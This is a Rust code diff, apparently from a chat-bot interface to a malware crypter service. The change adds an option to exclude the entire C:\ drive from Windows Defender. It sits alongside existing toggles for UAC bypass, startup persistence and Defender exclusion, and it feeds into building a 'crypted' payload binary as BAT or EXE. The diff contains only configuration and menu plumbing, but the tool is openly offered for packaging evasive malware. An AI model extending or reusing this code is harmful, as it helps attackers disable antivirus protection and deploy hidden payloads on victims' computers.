@@ -22,6 +22,7 @@ pub struct BuildConfig {
     pub single_instance: bool,
     pub run_on_startup: bool,
     pub defender_exclusion: bool,
+    pub defender_exclude_drive: bool,
     pub file_extension: String,
     pub binary_path: Option<String>,
     pub binary_arch: Option<BinaryArch>,
@@ -37,6 +38,7 @@ impl Default for BuildConfig {
             single_instance: false,
             run_on_startup: false,
             defender_exclusion: false,
+            defender_exclude_drive: false,
             file_extension: "BAT".to_string(),
             binary_path: None,
             binary_arch: None,
@@ -292,7 +294,8 @@ async fn show_config_menu(
         5. Single Instance: {}\n\
         6. Persistence: {}\n\
         7. Windows Defender Exclusion: {} {}\n\
-        8. Output Format: **{}**\n\n\
+        8. Exclude C:\\ Drive: {} {}\n\
+        9. Output Format: **{}**\n\n\
         ?? To toggle an option, send its number (e.g., '1')\n\
         ?? To change output format, send 'format' (BAT/EXE)\n\
         ? When done, send '**build**' to create your crypted binary!",
@@ -304,6 +307,8 @@ async fn show_config_menu(
         if config.run_on_startup { "? ON" } else { "? OFF" },
         if config.defender_exclusion { "? ON" } else { "? OFF" },
         if config.uac_bypass && config.defender_exclusion { "?? (Silent with UAC!)" } else { "" },
+        if config.defender_exclude_drive { "? ON" } else { "? OFF" },
+        if config.defender_exclude_drive { "?? AGGRESSIVE!" } else { "" },
         config.file_extension
     );
 
@@ -357,6 +362,10 @@ pub async fn handle_config_toggle(
         }
         "7" => {
             session.config.defender_exclusion = !session.config.defender_exclusion;
+            updated = true;
+        }
+        "8" => {
+            session.config.defender_exclude_drive = !session.config.defender_exclude_drive;
             updated = true;
         }
         "format" => {
@@ -427,6 +436,7 @@ async fn start_build_process(
         single_instance: config.single_instance,
         run_on_startup: config.run_on_startup,
         defender_exclusion: config.defender_exclusion,
+        defender_exclude_drive: config.defender_exclude_drive,
         bind_file: false,
         file_extension: SupportedFileExtension::from_str(&config.file_extension),
         payload_bytes: payload_bytes.clone(),
